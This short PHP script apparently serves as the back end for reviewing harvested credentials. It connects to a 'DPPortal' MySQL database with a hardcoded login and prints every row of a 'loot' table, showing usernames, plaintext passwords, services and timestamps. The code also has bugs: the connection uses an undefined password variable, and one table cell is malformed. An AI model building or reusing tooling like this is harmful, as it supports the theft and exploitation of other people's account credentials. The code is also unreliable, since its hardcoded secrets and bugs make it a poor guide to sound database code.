<?php
   $servername = "localhost";
   $username  = "dpuser";
   $passwd = "Eggy123";
   $dbname = "DPPortal";

   //Creating a connection


   $conn = new mysqli($servername, $username, $password, $dbname);
   // Check connection
   if ($conn->connect_error) {
   	die("Connection failed: " . $conn->connect_error);
   }

   $sql = "SELECT * FROM loot";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
   echo "<table><tr><th>ID</th><th>Userame</th><th>Password</th><th>Service</th><th>Date/Time</th></tr>";
  // output data of each row
  while($row = $result->fetch_assoc()) {
    echo "<tr><td>".$row["id"]."</td><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["service"]."</td> ".$row["datetimestamp"]."</td></tr>";
  }
  echo "</table>";
} else {
  echo "0 results";
}
$conn->close();
?>
